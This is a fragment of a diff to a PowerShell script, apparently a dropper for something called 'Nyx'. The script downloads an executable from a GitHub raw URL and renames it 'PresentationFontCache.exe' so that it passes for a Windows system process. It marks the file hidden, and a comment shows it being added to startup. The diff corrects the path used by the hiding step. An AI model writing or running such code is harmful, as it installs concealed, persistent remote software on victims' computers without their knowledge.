@@ -22,7 +22,7 @@ Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/B8XY
 Rename-Item -Path "$env:TEMP\B8XY4K5A\B8XY4K5A.exe" -NewName "PresentationFontCache.exe"
 
 # Hide Nyx
-$FILE=Get-Item "$env:TEMP\B8XY4K5A\B8XY4K5A.exe" -Force
+$FILE=Get-Item "$env:TEMP\B8XY4K5A\PresentationFontCache.exe" -Force
 $FILE.attributes='Hidden'
 
 # Add Nyx to startup processes
